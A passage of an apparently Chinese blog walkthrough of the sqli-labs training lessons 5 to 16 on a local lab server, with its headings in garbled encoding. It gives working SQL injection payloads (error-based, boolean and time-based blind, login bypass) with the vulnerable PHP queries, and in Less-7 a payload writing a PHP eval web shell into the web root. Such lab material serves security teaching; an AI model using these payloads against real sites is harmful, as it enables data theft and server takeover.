class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,count(*),concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand(<span class="number">0</span>)*<span class="number">2</span>))a from information_schema.columns  group by a--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/jVI2pOsYowrS3e9.png" alt="5_1.png"></p><h5 id="åˆ©ç”¨-double-æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨-double-æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨ double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥"></a>åˆ©ç”¨ double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> (exp(~(<span class="literal">select</span> * FROM(SELECT USER())a))),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨-bigint-æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨-bigint-æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨ bigint æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥"></a>åˆ©ç”¨ bigint æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">union</span> <span class="literal">select</span> (!(<span class="literal">select</span> * from (<span class="literal">select</span> user())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨xpath-å‡½æ•°æŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨xpath-å‡½æ•°æŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨xpath å‡½æ•°æŠ¥é”™æ³¨å…¥"></a>åˆ©ç”¨xpath å‡½æ•°æŠ¥é”™æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/k4lyGzREivtZDOj.png" alt="5_2.png"></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> updatexml(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/qBsh1nNgyuUOJk4.png" alt="5_3.png"></p><h5 id="åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§"><a href="#åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§" class="headerlink" title="åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§"></a>åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from (<span class="literal">select</span> NAME_CONST(version(),<span class="number">1</span>), NAME_CONST(version(),<span class="number">1</span>))x--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/OoRQ4mK8lukwNcq.png" alt="5_4.png"></p><h5 id="å»¶æ—¶æ³¨å…¥"><a href="#å»¶æ—¶æ³¨å…¥" class="headerlink" title="å»¶æ—¶æ³¨å…¥"></a>å»¶æ—¶æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;UNION SELECT (IF(SUBSTRING(current,<span class="number">1</span>,<span class="number">1</span>)=CHAR(<span class="number">115</span>),BENCHMARK(<span class="number">50000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),null)),<span class="number">2</span>,<span class="number">3</span> FROM (<span class="literal">select</span> database() as cur</span><br><span class="line">rent) as tb1--+</span><br></pre></td></tr></table></figure><h3 id="Less-6-GET-Double-Injection-Double-Quotes-String-åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-6 GET - Double Injection - Double Quotes - String (åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-4"><a href="#æ‰‹åŠ¨æ³¨å…¥-4" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åˆ©ç”¨æŠ¥é”™æ³¨å…¥å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-6/?id=1&quot;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-5"><a href="#æºç åˆ†æ-5" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨<code>&quot;&quot;</code>æ¥å¤„ç†<code>$id</code>ï¼Œä¸å›æ˜¾æ­£å¸¸è¾“å‡ºçš„ä¿¡æ¯ã€‚</p><h3 id="Less-7-GET-Dump-into-outfile-String-ï¼ˆå¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ï¼‰"><a href="#Less-7-GET-Dump-into-outfile-String-ï¼ˆå¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ï¼‰" class="headerlink" title="Less-7 GET - Dump into outfile - String ï¼ˆå¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ï¼‰"></a>Less-7 GET - Dump into outfile - String ï¼ˆå¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ï¼‰</h3><h4 id="æºç åˆ†æ-6"><a href="#æºç åˆ†æ-6" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ˜¯ä½¿ç”¨äº†<code>((&#39;&#39;))</code>æ¥å¤„ç†è¾“å…¥ã€‚</p><h4 id="æ‰‹åŠ¨æ³¨å…¥-5"><a href="#æ‰‹åŠ¨æ³¨å…¥-5" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;)) <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#å°†user,2,3å†™å…¥æ–‡ä»¶uuu.txtä¸­</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT user(),<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;E:\\xampp\\Xampp\\htdocs\\sqli-labs\\Less-7\\uuu.txt&quot;</span>--+</span><br><span class="line"><span class="comment">#å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥è¿›å»</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT <span class="string">&#x27;&lt;?php <span class="variable">@eval</span>(<span class="variable">$_POST</span>[&quot;attack&quot;])?&gt;&#x27;</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;E:\\xampp\\Xampp\\htdocs\\sqli-labs\\Less-7\\attack.php&quot;</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-6"><a href="#æ‰‹åŠ¨æ³¨å…¥-6" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æµ‹è¯•æ³¨å…¥ç‚¹</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#å¸ƒå°”ç›²æ³¨</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27; and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-7"><a href="#æºç åˆ†æ-7" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€å…³é”™è¯¯ä¿¡æ¯ä¹Ÿä¸å†å›æ˜¾ï¼Œä½†å¯ä»¥é€šè¿‡æ˜¯å¦å‡ºç°<code>You are in...........</code>æ¥å®ç°å¸ƒå°”ç›²æ³¨ã€‚</p><h3 id="Less-9-GET-Blind-Time-based-Single-Quotes-åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨" class="headerlink" title="Less-9 GET - Blind - Time based. - Single Quotes (åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨)"></a>Less-9 GET - Blind - Time based. - Single Quotes (åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-7"><a href="#æ‰‹åŠ¨æ³¨å…¥-7" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ—¶é—´ç›²æ³¨</span></span><br><span class="line"><span class="comment">#çŒœæµ‹æ•°æ®åº“security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;and If(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-8"><a href="#æºç åˆ†æ-8" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-10-GET-Blind-Time-based-double-quotes-åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨"><a href="#Less-10-GET-Blind-Time-based-double-quotes-åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨)"></a>Less-10 GET - Blind - Time based - double quotes (åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨)</h3><p>è¾“å…¥è¢«ç”¨<code>&quot;&quot;</code>å¤„ç†ï¼Œå…¶ä»–ä¸less-9ç›¸åŒã€‚</p><h3 id="Less-11-POST-Error-Based-Single-quotes-String-åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-11-POST-Error-Based-Single-quotes-String-åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-11 POST - Error Based - Single quotes- String (åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-8"><a href="#æ‰‹åŠ¨æ³¨å…¥-8" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>postæ¥æ”¶å‚æ•°</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¸‡èƒ½ï¼Œå¯†ç éšæ„</span></span><br><span class="line">admin&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#çˆ†åº“åï¼Œå¯†ç éšæ„</span></span><br><span class="line">1admin<span class="string">&#x27;union select 1,database()#</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-9"><a href="#æºç åˆ†æ-9" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-åŸºäºé”™è¯¯çš„åŒå¼•å·POSTå‹å­—ç¬¦å‹å˜å½¢çš„æ³¨å…¥"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-åŸºäºé”™è¯¯çš„åŒå¼•å·POSTå‹å­—ç¬¦å‹å˜å½¢çš„æ³¨å…¥" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (åŸºäºé”™è¯¯çš„åŒå¼•å·POSTå‹å­—ç¬¦å‹å˜å½¢çš„æ³¨å…¥)"></a>Less-12 POST - Error Based - Double quotes- String-with twist (åŸºäºé”™è¯¯çš„åŒå¼•å·POSTå‹å­—ç¬¦å‹å˜å½¢çš„æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-9"><a href="#æ‰‹åŠ¨æ³¨å…¥-9" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#postä¼ å…¥</span></span><br><span class="line">uname=1&quot;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-10"><a href="#æºç åˆ†æ-10" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-13-POST-Double-Injection-Single-quotes-String-twist-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥" class="headerlink" title="Less-13 POST - Double Injection - Single quotes- String -twist (POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥)"></a>Less-13 POST - Double Injection - Single quotes- String -twist (POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-10"><a href="#æ‰‹åŠ¨æ³¨å…¥-10" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>å…ˆç”¨ä¸‡èƒ½å¯†ç ç™»å½•ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/j7OKIP4yh2SV8x5.png" alt="13.png"></p><p>ç™»å½•æˆåŠŸåä¾¿å¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨çˆ†åº“ç­‰ä¿¡æ¯ã€‚</p><h4 id="æºç åˆ†æ-11"><a href="#æºç åˆ†æ-11" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥" class="headerlink" title="Less-14 POST - Double Injection - Single quotes- String -twist (POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥)"></a>Less-14 POST - Double Injection - Single quotes- String -twist (POSTå•å¼•å·å˜å½¢åŒæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-11"><a href="#æ‰‹åŠ¨æ³¨å…¥-11" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¸‡èƒ½å¯†ç </span></span><br><span class="line">admin&quot;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#æŠ¥é”™æ³¨å…¥</span></span><br><span class="line">uname=admin<span class="string">&quot;and extractvalue(1,concat(0x7e,(select @<span class="variable">@version</span>),0x7e))#&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/JoPmqcNLdfSwTi7.png" alt="14.png"></p><h4 id="æºç åˆ†æ-12"><a href="#æºç åˆ†æ-12" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-åŸºäºboolå‹-x2F-æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹ç›²æ³¨"><a href="#less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-åŸºäºboolå‹-x2F-æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹ç›²æ³¨" class="headerlink" title="less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (åŸºäºboolå‹&#x2F;æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹ç›²æ³¨)"></a>less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (åŸºäºboolå‹&#x2F;æ—¶é—´å»¶è¿Ÿå•å¼•å·POSTå‹ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-12"><a href="#æ‰‹åŠ¨æ³¨å…¥-12" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä½¿ç”¨å»¶æ—¶æ³¨å…¥ï¼Œæ­£ç¡®ç›´æ¥ç™»å½•æˆåŠŸï¼Œå¦åˆ™å»¶æ—¶5sã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-13"><a href="#æºç åˆ†æ-13" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-åŸºäºboolå‹-x2F-æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨"><a href="#Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-åŸºäºboolå‹-x2F-æ—¶é—´å»¶è¿Ÿçš„åŒå¼•å·POSTå‹ç›²æ³¨" class="headerlink" title="Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes 